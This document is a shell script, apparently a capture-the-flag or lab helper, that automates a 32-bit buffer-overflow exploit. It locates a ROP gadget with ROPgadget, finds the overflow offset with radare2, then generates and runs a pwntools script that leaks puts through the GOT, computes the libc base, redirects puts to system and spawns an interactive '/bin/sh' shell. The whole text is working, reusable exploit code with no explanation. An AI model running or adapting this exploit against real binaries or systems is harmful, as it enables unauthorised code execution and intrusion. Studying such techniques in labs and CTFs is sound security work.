line=$(ROPgadget --binary $1 | grep -x '.\{26\}' | grep -m 1 'pop ebx')
echo $line
address=${line:0:10}
echo $address

ragg2 -P 400 -r > pattern.txt
echo "!/usr/bin/rarun2" > profile.rr2
echo "stdin=./pattern.txt" >> profile.rr2
exec 3>&1 1>r2log
r2 -r profile.rr2 -d $1 << EOF
dc
wopO \`dr ebp\`
EOF

cat << EOF > sledge32.py
from pwn import *
import sys
print("STARTING PYTHON SCRIPT")
#reveng prereqs (ALSO figure out how to read the leak... e.g. putslibc = u64(leak[-7:-1]+b'\x00\x00'))
binaryname = sys.argv[1]
onepopgadget = sys.argv[2]
onepopgadget = int(onepopgadget, 16)
offset = int(sys.argv[3]) + 4
print(offset)
print(hex(onepopgadget))
def readleak(resp, putoff):
    findme = bytes([putoff % 256])
    addrstart = resp.find(findme)
    countme = resp.count(findme)
    if countme > 1:
        print("MANY FOUND...")
        winner = addrstart
        nextnibble = (putoff >> 8) % 16
        foundOne = False
        for ii in range(countme):
            if resp[winner+1] % 16 == nextnibble:
                foundOne = True
                break
            else:
                winner = resp.find(findme, winner + 1)
        if foundOne:
            addrstart = winner
        else:
            print("Failed to find leak")
    return u32(resp[addrstart:addrstart + 4])
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
putsoffset = libc.symbols['puts']
glcsysoff = libc.symbols['system']
elf=ELF(binaryname)
bytediff = elf.got["gets"] - elf.got["puts"]
if (bytediff > 0):
    numgets = int(bytediff/4)
else:
    numgets = 0
p=process(binaryname)
intro = p.recv()
print(intro)
payload = b"A"*offset
payload += p32(elf.plt["puts"]) + p32(onepopgadget) + p32(elf.got["puts"])
payload += p32(elf.plt["gets"]) + p32(onepopgadget) + p32(elf.got["puts"])
payload += p32(elf.plt["gets"]) + p32(onepopgadget) + p32(elf.got["puts"]-0x10)
payload += p32(elf.plt["puts"]) + p32(onepopgadget) + p32(elf.got["puts"]-0x10)
p.sendline(payload)
print(payload)
leak = p.recv()
print(leak)
putslibc = readleak(leak, putsoffset)
print(hex(putslibc))
glibcbase = putslibc - putsoffset
libc.address = glibcbase
p.sendline(p32(libc.symbols["system"]) + p32(libc.symbols['gets'])*numgets)
p.sendline(b"/bin/sh\x00")
p.interactive()
EOF
chmod +x sledge32.py

exec 1>&3 3>&-
cat r2log | tail -2 > offsetfile
head -1 offsetfile > r2log
offsetminus4=$(tail -c 4 r2log)
python3 sledge32.py $1 $address $offsetminus4
